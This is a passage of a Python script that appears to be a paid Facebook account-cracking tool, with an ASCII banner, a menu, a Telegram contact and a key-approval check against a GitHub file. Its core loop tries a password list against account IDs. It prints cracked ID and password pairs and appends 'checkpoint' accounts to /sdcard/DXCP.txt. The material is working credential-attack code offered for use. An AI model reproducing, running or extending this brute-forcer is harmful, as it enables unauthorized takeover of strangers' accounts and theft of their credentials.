...
| $$  | $$ /$$/\  $$       | $$  | $$| $$  | $$| $$\  $ | $$  | $$  | $$  \ $$
| $$$$$$$/| $$  \ $$       | $$  | $$|  $$$$$$/| $$ \/  | $$ /$$$$$$| $$  | $$
|_______/ |__/  |__/       |__/  |__/ \______/ |__/     |__/|______/|__/  |__/
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[AUTHOR                   • \33[1;38mAjmir Hossain ]\33[1;38m     ║\033[1;31m 
╠══[FACEBOOK                 • DX Ajmir Hossain  ]   ║  \033[1;97m  
╠══[GITHUB                   • \33[1;38mDX-142 ]   ║\33[1;34m   
...
def Main():
        ...
        if Alhaj in ["1","01"]:
            sexy()
        if Alhaj in ["2","02"]:
        	os.system('xdg-open t.me/.me/+8801813225678')
        if Alhaj in [" 0", "00"]:
            exit()
        else:
            exit()     
...
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[DX-KING]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
...
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     The Ajmir𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     The Ajmir𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                break
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mDX-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/DXCP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def approval():
	...
	key = "6".join(uuid)
	a=requests.get("https://github.com/DX-142/Approval-1-/blob/main/Approval.txt").text
	if key in a:
		Main()
	else:
		...
		os.system("clear")
		print(logo)
		print("TOOL IS PAID NEED PERMISSION ")
		print("PLEASE CONTACT TO DX-AJMIR")
		os.system('espeak -a 300 "' For approved contact DX-AJMIR"')
		print("Your key : "+frist+key+last)
		print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
		os.system("xdg-open https://t.me/ajmir_hossain_008")
approval()
